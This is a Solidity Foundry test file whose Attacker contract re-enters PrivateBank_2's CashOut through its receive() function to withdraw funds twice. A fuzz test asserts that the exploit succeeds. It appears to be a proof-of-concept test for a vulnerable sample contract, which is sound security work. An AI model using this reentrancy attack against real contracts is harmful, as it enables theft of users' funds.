
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {PrivateBank_2, Log} from "../src/PrivateBank_2.sol";

contract TestReentrancyPrivateBank_2 is Test {

    PrivateBank_2 public bank;
    
    Attacker public _attacker;

    function setUp() public {
        Log log = new Log();
        bank = new PrivateBank_2(address(log));
        _attacker = new Attacker(address(bank));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        vm.assume(attackVal >= 2 ether && attackVal % 2 == 0 && attackVal <= type(uint128).max);
        
        vm.deal(address(bank), attackVal * 2); 
        
        vm.deal(address(_attacker), attackVal * 2);

        vm.deal(address(this), attackVal * 2);
        
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    PrivateBank_2 public bank;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public attackAmount;

    constructor(address victimAddress) { 
        bank = PrivateBank_2(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        bank.Deposit{value: val}();
        attackAmount = val / 2;
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;

        bank.CashOut(attackAmount);

        uint256 finalBalance = address(this).balance;
        if (finalBalance - initialSnapshot >= 2 * attackAmount) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            bank.CashOut(attackAmount);
        }
    }
}
